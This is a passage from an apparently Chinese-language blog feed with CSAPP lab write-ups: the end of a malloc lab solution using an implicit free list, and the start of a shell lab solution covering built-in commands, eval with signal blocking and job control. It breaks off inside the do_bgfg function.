    <span class="token punctuation">{</span>
        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">else</span> 
    <span class="token punctuation">{</span>
        size <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bp <span class="token operator">=</span> <span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>合并块有4种可能的情况。</p>
<p><img src="3.png" alt=""></p>
<p>上面代码的顺序和上图的顺序是一致的。所谓合并，就是修改上一个或者下一个块的头和尾中的size。使之变成合并后的size。</p>
<h4 id="mm_free"><a href="#mm_free" class="headerlink" title="mm_free"></a>mm_free</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>释放块，其实就是将头和尾的标志位修改为0，然后将这个块与前一个块或者后一个块合并。</p>
<h4 id="mm_malloc"><a href="#mm_malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/*
    int newsize = ALIGN(size + SIZE_T_SIZE);
    void *p = mem_sbrk(newsize);
    if (p == (void *)-1)
    return NULL;
    else {
        *(size_t *)p = size;
        return (void *)((char *)p + SIZE_T_SIZE);
    }
    */</span>
    size_t asize<span class="token punctuation">;</span>
    size_t extendsize<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;=</span> DSIZE<span class="token punctuation">)</span>
        asize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> DSIZE<span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        asize <span class="token operator">=</span> DSIZE <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>DSIZE<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">find_fit</span><span class="token punctuation">(</span>asize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span><span class="token punctuation">(</span>extendsize<span class="token operator">/</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> asize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这算是最主要的部分了。分配内存主要分为对齐，最适搜索， 扩展堆。</p>
<p>对齐这个不难明白，就是如果申请的大小不是双字对齐，需要将其对齐，虽然这样会产生碎片。另外，参考之前的空堆结构可知，申请的空间最小要是16字节。其中8个字节存放头和尾，8个字节满足对齐要求。在调整了请求大小后，开始搜索空闲链表，寻找合适的空闲块。如果有，就放这个请求块，没有就需要申请新的空闲块来扩展堆,然后再放这个块。</p>
<p>这里用到了两个函数，find_fit和place，接着就要来完善这两个函数。</p>
<h4 id="find_fit"><a href="#find_fit" class="headerlink" title="find_fit"></a>find_fit</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">find_fit</span><span class="token punctuation">(</span>size_t asize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>   
    <span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>bp <span class="token operator">=</span> head_listp<span class="token punctuation">;</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>asize <span class="token operator">&lt;=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> bp<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里是用首次适配搜索。从隐式空闲链表的开头开始，寻找首个合适的未分配的块。</p>
<h4 id="place"><a href="#place" class="headerlink" title="place"></a>place</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> size_t asize<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    size_t csize <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>csize <span class="token operator">-</span> asize<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>csize<span class="token operator">-</span>asize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>csize<span class="token operator">-</span>asize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>csize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>csize<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>若是寻找到了合适的块，这时就要将这个块放进去。这里有两种情况，如果当前找到的块比需要填入的块大于或等于16字节，证明这个块还能够分裂成两个块，所以需要做分裂操作。不然就直接将这个整个块标记为已分配，也就是说这里存在小于16字节的碎片。</p>
<h4 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h4><p>隐式空闲链表可能说稍微容易点，得分87/100，这就证明其中有能够优化的地方，比如书中提到的显示空闲链表和分离链表，有机会我会再试试其他的方法，更巧妙的比如BST或者splay伸展树等等。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP Lab5 解题分析]]></title>
      <url>http://xinqiu.me/2016/07/12/csapp-lab5-shelllab/</url>
      <content type="html"><![CDATA[<p>这个实验是要实现一个简易的shell程序，主要考虑的是异常和信号的处理。</p>
<!--toc-->
<h4 id="u524D_u671F_u5DE5_u4F5C"><a href="#u524D_u671F_u5DE5_u4F5C" class="headerlink" title="前期工作"></a>前期工作</h4><p>解压缩<code>shlab-handout.tar</code>，执行<code>make clean | make</code>,就可以得到编译好的文件。</p>
<p>文件夹中的<code>tshref</code>是正确的结果，可以用来验证。与其用</p>
<pre><code>./sdriver.pl -t trace01.txt -s ./tsh -a &quot;-p&quot;
</code></pre><p>来测试，我觉得实验手册里提到的另一种方法更好用，</p>
<pre><code>make test01
</code></pre><p>这是对自己写的tsh进行测试，要想对tshref进行测试，只需要在后面的test前面添加一个<code>r</code>即可，也就是<code>make rtest01</code>。</p>
<a id="more"></a>
<h4 id="u9700_u8981_u5B9E_u73B0_u7684_u51FD_u6570"><a href="#u9700_u8981_u5B9E_u73B0_u7684_u51FD_u6570" class="headerlink" title="需要实现的函数"></a>需要实现的函数</h4><ul>
<li>void eval(char *cmdline) 执行用户输入的命令</li>
<li>int builtin_cmd(char **argv) 执行内部命令</li>
<li>void do_bgfg(char **argv) 执行bg和fg命令</li>
<li>void waitfg(pid_t pid) block进程直到它不再是前台进程</li>
<li>void sigchld_handler(int sig) SIGCHLD信号处理</li>
<li>void sigint_handler(int sig) SIGINT信号处理</li>
<li>void sigtstp_handler(int sig) SIGTSTP信号处理</li>
</ul>
<h4 id="builtin_cmd"><a href="#builtin_cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h4><p>这是比较好写的一个函数，我选择第一个把他完成。按照实验文档说的，当输入quit时，退出tsh。输入jobs就列出存在的job。输入fg/bg是前台后台执行命令。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * builtin_cmd - If the user has typed a built-in command then execute
 *    it immediately.  
 */</span>
<span class="token keyword">int</span> <span class="token function">builtin_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"quit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// quit</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"jobs"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// jobs</span>
    <span class="token punctuation">{</span>
        <span class="token function">listjobs</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// echo</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"bg"</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"fg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// bg or fg</span>
    <span class="token punctuation">{</span>  
        <span class="token function">do_bgfg</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/* not a builtin command */</span>
<span class="token punctuation">}</span>
</code></pre>
<p>大概闲着无聊，添加了个最简易最简易的echo233.</p>
<h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>执行函数算是基础，参考书中图8-23中的eval，可以大概知道eval函数应该是什么样子的。但那只是简易并有缺陷的shell，它并不能回收后台子进程，所以之后就要用到信号的相关知识。关于阻塞信号，可以用到以下三个函数:</p>
<ul>
<li>int sigemptyset(sigset_t *set);</li>
<li>int sigaddset(sigset_t *set, int signum);</li>
<li>int sigprocmask(int how, const sigset_t *set, sigset_t *oldset);</li>
</ul>
<p>这类似线程锁，SIG_BLOCK和SIG_UNBLOCK用来加锁和解除锁。是用sigprocmask来同步进程，可以保证父进程在相应的deletejob之前执行了addjob。</p>
<p>另外eval还要处理job的添加，这分前台执行和后台执行。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * eval - Evaluate the command line that the user has just typed in
 * 
 * If the user has requested a built-in command (quit, jobs, bg or fg)
 * then execute it immediately. Otherwise, fork a child process and
 * run the job in the context of the child. If the job is running in
 * the foreground, wait for it to terminate and then return.  Note:
 * each child process must have a unique process group ID so that our
 * background children don't receive SIGINT (SIGTSTP) from the kernel
 * when we type ctrl-c (ctrl-z) at the keyboard.  
*/</span>
<span class="token keyword">void</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmdline<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span>MAXARGS<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> bg<span class="token punctuation">;</span>
    pid_t pid<span class="token punctuation">;</span>
    sigset_t mask<span class="token punctuation">;</span>

    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
    bg <span class="token operator">=</span> <span class="token function">parseline</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">builtin_cmd</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        <span class="token comment" spellcheck="true">// Block SIGCHLD</span>
        <span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sigaddset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> SIGCHLD<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token comment" spellcheck="true">// Child process ,set new process group, run command </span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"setpgid error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> environ<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Command not found\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> 
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bg<span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> FG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// add job to job list as fg</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> BG<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// add job to job list as bg</span>
            <span class="token punctuation">}</span>
            <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_UNBLOCK<span class="token punctuation">,</span> <span class="token operator">&amp;</span>mask<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Parent unblocks SIGCHLD</span>


            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bg<span class="token punctuation">)</span>
                <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> 
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h4><p>waitfg就是要等待前台进程结束，所以只需要用循环即可</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * waitfg - Block until process pid is no longer the foreground process
 */</span>
<span class="token keyword">void</span> <span class="token function">waitfg</span><span class="token punctuation">(</span>pid_t pid<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="do_bgfg"><a href="#do_bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h4><p>这是前台和后台的切换，一些条件细节就不多说，其中主要是JID和PID的判断。bg job 给后台 job 发送 SIGCONT 信号来继续执行该任务，fg job 给前台 job 发送 SIGCONT 信号来继续执行该任务。首先要判断进程是否继续执行。关于前后台的执行，主要做的就是修改job的state状态。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * do_bgfg - Execute the builtin bg and fg commands
 */</span>
<span class="token keyword">void</span> <span class="token function">do_bgfg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> job_t <span class="token operator">*</span>job<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>id <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> jid<span class="token punctuation">;</span>    

    <span class="token comment" spellcheck="true">// If id does not exist</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s command requires PID or %%jobid argument\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// For a JID</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'%'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        jid<span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>id<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>job<span class="token operator">=</span> <span class="token function">getjobjid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> jid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: No such job\n"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>  
